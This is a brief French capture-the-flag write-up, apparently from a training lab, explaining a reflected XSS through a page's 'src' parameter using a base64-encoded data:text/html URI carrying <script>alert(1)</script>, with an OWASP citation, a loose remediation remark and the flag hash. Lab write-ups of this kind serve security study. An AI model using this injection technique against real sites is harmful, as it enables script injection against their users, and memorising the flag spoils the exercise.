Ici la faille exploité est aussi une faille XSS mais via la méthode GET "src" du site.
Pour y accéder il faut ce rendre sur la page de l'image NSA a la fin dee la pge d'accueil.

le payload :
    <script>alert(1)</script> en base64 => PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

puis il faut insérer tout ceci derrière src= dans le lien du site : data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

Sources concernant le payload :
    EMBED SVG Which Contains XSS Vector from https://owasp.org/www-community/xss-filter-evasion-cheatsheet

Pour éviter ce genre de faille l'idéal serais de stocker ces images dans une base de donnée

flag : 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D